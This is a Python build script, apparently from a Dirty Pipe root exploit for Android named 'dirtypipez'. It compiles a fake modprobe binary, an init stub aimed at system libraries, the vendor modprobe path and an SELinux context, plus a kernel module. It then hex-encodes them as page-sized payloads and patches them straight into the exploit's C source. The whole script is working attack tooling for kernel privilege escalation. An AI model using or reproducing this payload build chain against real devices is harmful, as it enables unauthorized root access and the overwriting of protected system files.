import os
import re

def cc(_in, _out, extra=[]):
    args = [
        "aarch64-linux-android31-clang",
        "-Os",
        "-fno-stack-protector",
    ]
    args.extend(extra)
    args.extend([
        "-o",
        _out,
        _in
    ])
    os.system(" ".join(args))


cc('modprobe.c', 'modprobe', [
    "-e_start",
    "-nostartfiles"
])

with open('modprobe', 'rb') as f:
    payload = f.read()

modprobe_payload = '\\x' + ('\\x'.join(re.findall('..', payload[1:].hex())))
modprobe_payload_len = len(payload) - 1
if modprobe_payload_len > 4096:
    raise Exception('limited modprobe payload ftm')

with open('init.S', 'w') as f:
    f.write(
f""".global _start
.global _pwn

_bridge:
    .asciz "/system/lib64/libtracingproxy.so"

_ko_lib:
    .asciz "/vendor/lib/libstagefright_soft_mp3dec.so"

_modprobe:
    .asciz "/vendor/bin/modprobe"

_modprobe_context:
    .asciz "u:r:vendor_modprobe:s0"

_exec_attr:
    .asciz "/proc/self/attr/exec"

_start:
    bl _pwn
""")

cc('init.c', 'init', [
    "-nostdlib",
    "-nostartfiles",
    "-mexecute-only",
    "-static",
    "-c",
])

os.system(
    "llvm-objcopy -O binary -j .text init"
)

with open('init', 'rb') as f:
    payload = f.read()

init_payload_len = len(payload)
init_payload = '\\x' + ('\\x'.join(re.findall('..', payload.hex())))

# YOLO! PATCH THE C CODE STRAIGHT XD
with open('../app/src/main/c/dirtypipez.c', 'r') as f:
    dirtypipez = f.read().split('\n')


def replace_line(where: list[str], find_what: str, with_what: str):
    idx = where.index(list(filter(lambda x: find_what in x, where))[0])
    where[idx] = with_what


replace_line(
    dirtypipez,
    'iovec INIT_PAYLOAD',
    'const struct iovec INIT_PAYLOAD = { .iov_base = "%s", .iov_len = %d };' % (init_payload, init_payload_len)
)

replace_line(
    dirtypipez,
    'iovec MODPROBE_PAYLOAD',
    'const struct iovec MODPROBE_PAYLOAD = { .iov_base = "%s", .iov_len = %d };' % (modprobe_payload, modprobe_payload_len)
)

with open('dirtypipez.ko', 'rb') as f:
    ko_payload = f.read()

page = 0
while len(ko_payload) > 0:
    k_l = min(4096, len(ko_payload))
    k_p = '\\x' + ('\\x'.join(re.findall('..', ko_payload[1:k_l].hex())))
    tag = f'KO_PAGE_{page}'

    replace_line(
        dirtypipez,
        f'iovec {tag}',
        'const struct iovec %s = { .iov_base = "%s", .iov_len = %d };' % (tag, k_p, k_l - 1)
    )

    page += 1
    ko_payload = ko_payload[k_l:]

with open('../app/src/main/c/dirtypipez.c', 'w') as f:
    f.write('\n'.join(dirtypipez))
